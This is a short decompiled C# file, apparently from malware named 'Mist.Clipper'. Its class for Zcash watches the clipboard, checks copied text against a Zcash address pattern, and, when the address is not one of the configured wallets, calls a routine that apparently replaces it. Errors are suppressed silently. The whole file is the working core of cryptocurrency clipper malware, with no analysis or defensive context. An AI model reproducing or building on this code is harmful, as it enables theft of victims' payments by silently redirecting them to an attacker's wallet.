using System;
using System.Linq;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x02000081 RID: 129
	internal class zec
	{
		// Token: 0x060002F2 RID: 754 RVA: 0x00013A5C File Offset: 0x00011C5C
		public static void GetEtnWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletszec.Contains(text) && Checkzec.Clipregex(text))
					{
						Checkzec.Setszec(text);
					}
				}
			}
			catch
			{
			}
		}
	}
}
